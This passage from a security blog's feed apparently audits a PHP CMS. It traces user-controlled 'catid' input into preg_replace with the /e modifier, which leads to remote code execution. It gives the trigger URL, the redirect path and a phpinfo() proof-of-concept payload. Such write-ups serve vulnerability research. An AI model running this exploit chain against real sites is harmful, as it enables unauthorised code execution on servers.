class="keyword">array</span>(</span><br><span class="line">                        <span class="string">'selecttype'</span>=&gt;<span class="string">'select'</span>,</span><br><span class="line">                        <span class="string">'select'</span>=&gt;form::arraytoselect(getHtmlRule(<span class="string">'archive'</span>)),</span><br><span class="line">                        <span class="string">'default'</span>=&gt;<span class="string">''</span>,</span><br><span class="line">                ),</span><br><span class="line">        <span class="string">'tag_option'</span>=&gt;<span class="keyword">array</span>(</span><br><span class="line">        <span class="string">'selecttype'</span>=&gt;<span class="string">'select'</span>,</span><br><span class="line">        <span class="string">'select'</span>=&gt;form::arraytoselect(tag::getTags()),</span><br><span class="line">        ),</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>注意到这一句</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'default'</span>=&gt;<span class="keyword">get</span>(<span class="string">'catid'</span>),</span><br></pre></td></tr></table></figure><p>跟进get函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($var)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (front::get($var))</span><br><span class="line">        <span class="keyword">return</span> front::get($var);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (front::post($var))</span><br><span class="line">        <span class="keyword">return</span> front::post($var);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (config::get($var))</span><br><span class="line">        <span class="keyword">return</span> config::get($var);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (session::get($var))</span><br><span class="line">        <span class="keyword">return</span> session::get($var);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>继续跟进</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($var)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">self</span>::$get[$var]))</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">self</span>::$get[$var];</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">post</span><span class="params">($var)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">self</span>::$post[$var]))</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">self</span>::$post[$var];</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>最后跟进到front类中__construct()函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//关键语句</span></span><br><span class="line"><span class="keyword">self</span>::$get=$_GET;</span><br><span class="line"><span class="keyword">self</span>::$post=$_POST;</span><br></pre></td></tr></table></figure><p>这就说明catid和defult的值都是我们可以控制的，这样我们就可以通过控制$form[$name(catid)] [‘default’]来达到执行任意代码的目的</p><p>此时我们需要寻找一个触发get_form()函数的地方，并且再触发该函数后需要引用guestadd.php页面以此衔接我们的利用操作，全局搜索后定位在 /lib/default/manage_act.php ，该文件在第29行对get_form()函数进行了调用</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$<span class="function"><span class="title">this</span>-&gt;</span><span class="function"><span class="title">view</span>-&gt;</span><span class="function"><span class="title">form</span>=$this-&gt;</span>_<span class="function"><span class="title">table</span>-&gt;</span>get_form();</span><br></pre></td></tr></table></figure><p>同时在/lib/tool/front_class.php 文件的front类中存在这样的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (@$_GET[<span class="string">'g'</span>] &amp;&amp;is_numeric(@$_GET[<span class="string">'g'</span>])) &#123;    </span><br><span class="line">header(<span class="string">'location: ?case=manage&amp;act=guestadd&amp;manage=archive&amp;guest=1'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该文件是网站入口文件index.php所引用的，所以我们访问如下url即可触发</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//localhost/?g=1</span></span><br></pre></td></tr></table></figure><p>接着会被重定向为这样：</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/<span class="meta">index</span>.php?case=manage<span class="variable">&amp;act</span>=guestadd<span class="variable">&amp;manage</span>=archive<span class="variable">&amp;guest</span>=1</span><br></pre></td></tr></table></figure><p>这时只要post过去符合正则匹配的代码就可以了</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">'/\&#123;\?([^&#125;]+)\&#125;/e'</span><br><span class="line"><span class="comment">//该段正则表达式即为匹配&#123;?任意内容&#125;,当post如下语句时就会触发执行</span></span><br><span class="line"><span class="comment">//catid=&#123;?(phpinfo())&#125;</span></span><br></pre></td></tr></table></figure><p>梳理一下利用过程：</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">index.php-&gt;</span><br><span class="line">(<span class="regexp">/lib/tool</span><span class="regexp">/front_class.php)-&gt;</span></span><br><span class="line"><span class="regexp">(/lib</span><span class="regexp">/default/manage</span>_act.php)[-&gt;get_form()]-&gt;</span><br><span class="line">(cache/template/default/manage/<span class="comment">#guestadd.php)[-&gt;getform('catid'...)]-&gt;</span></span><br><span class="line">(<span class="class"><span class="keyword">lib</span>/<span class="title">tool</span>/<span class="title">form</span>.<span class="title">php</span>)[<span class="title">preg_reolace</span>()]//<span class="title">RCE</span></span></span><br></pre></td></tr></table></figure><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>当我们传入{?(phpinfo())}时，函数会变成这样</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_replace('/\&#123;\?([^&#125;]+)\&#125;/e',<span class="string">"eval('return $1;')"</span>,<span class="string">"&#123;?(phpinfo())&#125;"</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure><p>匹配成功后会执行eval(‘return $1;’)</p><p>而(phpinfo())在正常情况下同样会执行</p><p><img src="https://i.loli.net/2019/08/13/moqT8OQ3nCGEVKA.png" alt=""></p><p>执行成功会返回true这样前面的eval(‘return $1;’)就相当于eval(‘return phpinfo();’)，所以出现了代码执行</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;源码分析&quot;&gt;&lt;a href=&quot;#源码分析&quot; class=&quot;headerlink&quot; title=&quot;源码分析&quot;&gt;&lt;/a&gt;源码分析&lt;/h1&gt;&lt;p&gt;该处漏洞主要是&lt;strong&gt;preg_replace&lt;/strong&gt; 函数/e模式下存在的代码执行问题，虽然该程序版本较
      
    
    </summary>
    
    
    
      <category term="代码审计" scheme="https://yml-sec.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
</feed>
